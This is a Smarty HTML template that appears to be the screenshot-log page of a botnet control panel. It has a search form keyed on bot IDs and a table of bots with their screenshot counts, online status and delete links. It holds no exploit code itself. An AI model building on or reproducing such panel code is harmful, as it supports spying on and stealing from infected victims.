
<div class="top_menu">

<div class="top_menu_left">
<span style="font-size: 22px; color:#CCCCCC">{$lang.lscreen}</span>
</div>

<div class="top_menu_right">
{if $_SESSION.user->access.logs.index eq on}<a href="/logs/index.html">{$lang.logs}</a>&nbsp;{/if}
</div>

</div>
<hr />

<form action="#" method="post" enctype="multipart/form-data" name="filter" id="filter">

<div style="text-align: right; padding-right: 10px; padding-left: 10px;">
{$lang.puid} (<a onclick="alert('{$lang.puid_desc}');" style="cursor:pointer">?</a>): <input name="puid" type="text" style="width:600px" value="{$_SESSION.search.screen.puid}"/>
<hr />
{$lang.ctype} (<a onclick="alert('{$lang.ctype_desc}');" style="cursor:pointer">?</a>): <select id="type" name="type" style="width:600px;">
<option value="">{$lang.all}</option>
{foreach from=$types item=type}
<option value="{$type}"{if $_SESSION.search.screen.type eq $type} selected="selected"{/if}>{$type|@strtoupper}</option>
{/foreach}
</select>
<hr />
<input type="button" name="search" value="{$lang.search}" style="width:100%" onclick="return get_hax({ldelim}url: '/logs/screen.html?ajax=1',method:'post',id:'content',form:'filter'{rdelim});" />
</div>
</form>

{if $items}
<br />
<table cellspacing="1" cellpadding="5" class="t" style="width: 100%; text-align:center; border: 1px solid #cccccc;">
<tr class="t4">
	<td class="bg3">{$lang.bot}</td>
    <td class="bg3" style="width:20%">{$lang.count}</td>
    <td class="bg3" style="width:1px">&nbsp;</td>
</tr>
{foreach from=$items item=file name=files}
{if $smarty.foreach.files.iteration is not even}{assign var=bg value=2}{else}{assign var=bg value=1}{/if}
<tr class="bg{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="cursor:pointer;">
    <th {if $online[$file->prefix][$file->uid]}style="background-color:#0F0"{/if}><a onclick="get_bot_window('{$file->prefix}{$file->uid}');">{$file->prefix}{$file->uid}</a></th>
    <th onclick="get_sl_window('{$file->prefix}{$file->uid}');">{$file->count}</th>
    <th><a href="/logs/screen.html?x={$file->prefix}{$file->uid}"><img src="/images/delete.png" /></a></th>
</tr>
{/foreach}
</table>
{/if}